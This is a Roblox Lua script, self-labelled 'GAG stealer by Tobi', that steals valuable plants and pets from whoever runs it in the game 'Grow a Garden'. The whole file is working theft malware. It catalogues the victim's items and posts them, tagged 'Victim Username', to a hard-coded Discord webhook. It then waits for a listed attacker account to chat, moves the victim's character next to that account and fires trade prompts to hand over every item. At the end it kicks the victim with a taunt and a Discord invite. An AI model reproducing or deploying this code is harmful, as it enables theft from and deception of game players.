_G.Usernames = {"deadly_bbc", "Mrcrumped", "smurfglurp"} -- you can add as many as you'd like
_G.min_value = 100000000 -- 100 million
_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
_G.webhook = "https://discord.com/api/webhooks/1427856748990959727/oIWRwY-ve8SlM_g70i35wHc9hRBoNJxnw_rzyoS_FzNJv87jZEsWtePMR5858VgWj3gZ" -- change to your webhook
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))
local character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
local totalValue = 0
local itemsToSend = {}

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

if #Players:GetPlayers() >= 4 then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highestWeight = 0

    for _, item in ipairs(itemsToSend) do
        if item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end

    return highestWeight
end

-- Function to get all pets from player's pet inventory
local function getAllPets()
    local pets = {}
    local success, petData = pcall(function()
        return dataService:GetData().PetsData.PetInventory.Data
    end)
    
    if success and petData then
        for petUUID, petInfo in pairs(petData) do
            table.insert(pets, {
                UUID = petUUID,
                PetType = petInfo.PetType,
                PetData = petInfo.PetData,
                Value = calcPetValue(petInfo)
            })
        end
    end
    
    return pets
end

local function SendJoinMessage(list, prefix)
    -- Separate pets and plants for better organization
    local petList = {}
    local plantList = {}
    
    for _, item in ipairs(list) do
        if item.Type == "Pet" then
            table.insert(petList, item)
        else
            table.insert(plantList, item)
        end
    end
    
    local petInfo = ""
    local plantInfo = ""
    
    -- Format pet information
    if #petList > 0 then
        petInfo = "**Pets:**\n"
        for _, pet in ipairs(petList) do
            petInfo = petInfo .. string.format("- %s: ¢%s (Level %s)\n", 
                pet.Name, 
                formatNumber(pet.Value),
                pet.PetLevel or "?")
        end
        petInfo = petInfo .. "\n"
    end
    
    -- Format plant information
    if #plantList > 0 then
        plantInfo = "**Plants:**\n"
        for _, plant in ipairs(plantList) do
            plantInfo = plantInfo .. string.format("- %s (%.2f KG): ¢%s\n", 
                plant.Name, 
                plant.Weight, 
                formatNumber(plant.Value))
        end
    end
    
    local combinedItems = petInfo .. plantInfo
    if combinedItems == "" then
        combinedItems = "No items found"
    end
    
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
        },
        {
            name = "Pets Found:",
            value = tostring(#petList),
            inline = true
        },
        {
            name = "Plants Found:",
            value = tostring(#plantList),
            inline = true
        },
        {
            name = "Item list:",
            value = combinedItems,
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
    }
    
    -- Truncate if too long
    if #fields[5].value > 1024 then
        fields[5].value = string.sub(fields[5].value, 1, 1000) .. "\n... (truncated)"
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🐤 Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by Tobi | Includes Pet Detection"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local petList = {}
    local plantList = {}
    
    for _, item in ipairs(sortedItems) do
        if item.Type == "Pet" then
            table.insert(petList, item)
        else
            table.insert(plantList, item)
        end
    end
    
    local itemsText = ""
    
    if #petList > 0 then
        itemsText = itemsText .. "**Pets:**\n"
        for _, pet in ipairs(petList) do
            itemsText = itemsText .. string.format("- %s: ¢%s\n", pet.Name, formatNumber(pet.Value))
        end
        itemsText = itemsText .. "\n"
    end
    
    if #plantList > 0 then
        itemsText = itemsText .. "**Plants:**\n"
        for _, plant in ipairs(plantList) do
            itemsText = itemsText .. string.format("- %s (%.2f KG): ¢%s\n", plant.Name, plant.Weight, formatNumber(plant.Value))
        end
    end
    
    if itemsText == "" then
        itemsText = "No items found"
    end
    
    local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Pets Found:",
			value = tostring(#petList),
			inline = true
		},
		{
			name = "Plants Found:",
			value = tostring(#plantList),
			inline = true
		},
		{
			name = "Items sent:",
			value = itemsText,
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
	}
    
    if #fields[4].value > 1024 then
        fields[4].value = string.sub(fields[4].value, 1, 1000) .. "\n... (truncated)"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "🐤 New GAG Execution (With Pets)",
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "GAG stealer by Tobi | Includes Pet Detection"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

-- First scan backpack items (plants and equipped pets)
for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local success, v14 = pcall(function()
                return dataService:GetData().PetsData.PetInventory.Data[petUUID]
            end)
            
            if success and v14 then
                local itemName = v14.PetType
                if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                    if tool:GetAttribute("Favorite") then
                        replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                    end
                    local value = calcPetValue(v14)
                    local toolName = tool.Name
                    local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                    local petLevel = v14.PetData and v14.PetData.Level or 0
                    totalValue = totalValue + value
                    table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", PetLevel = petLevel})
                end
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

-- Also scan pet inventory for unequipped pets
local allPets = getAllPets()
for _, pet in ipairs(allPets) do
    -- Check if this pet is already in itemsToSend (already equipped)
    local alreadyIncluded = false
    for _, item in ipairs(itemsToSend) do
        if item.Type == "Pet" and item.Name == pet.PetType then
            alreadyIncluded = true
            break
        end
    end
    
    if not alreadyIncluded and (table.find(rarePets, pet.PetType) or (pet.Value >= min_value)) then
        local petLevel = pet.PetData and pet.PetData.Level or 0
        totalValue = totalValue + pet.Value
        table.insert(itemsToSend, {
            Tool = nil, 
            Name = pet.PetType, 
            Value = pet.Value, 
            Weight = 0, 
            Type = "Pet", 
            PetLevel = petLevel,
            UUID = pet.UUID
        })
    end
end

if #itemsToSend > 0 then
    -- Sort items (pets first, then plants, then by value)
    table.sort(itemsToSend, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(sentItems, prefix)

    local function doSteal(player)
        local victimRoot = character:WaitForChild("HumanoidRootPart")
        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
        wait(0.1)

        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")

        for _, item in ipairs(itemsToSend) do
            if item.Tool then -- Only process items that are actually in the backpack
                item.Tool.Parent = character
                if item.Type == "Pet" then
                    local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
                    repeat
                        task.wait(0.01)
                    until promptHead.Enabled
                    fireproximityprompt(promptHead)
                else
                    repeat
                        task.wait(0.01)
                    until promptRoot.Enabled
                    fireproximityprompt(promptRoot)
                end
                task.wait(0.1)
                item.Tool.Parent = backpack
                task.wait(0.1)
            end
        end

        local itemsStillInBackpack = true
        while itemsStillInBackpack do
            itemsStillInBackpack = false
            for _, item in ipairs(itemsToSend) do
                if item.Tool and backpack:FindFirstChild(item.Tool.Name) then
                    itemsStillInBackpack = true
                    break
                end
            end
            task.wait(0.1)
        end

        plr:kick("All your stuff (including pets!) just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
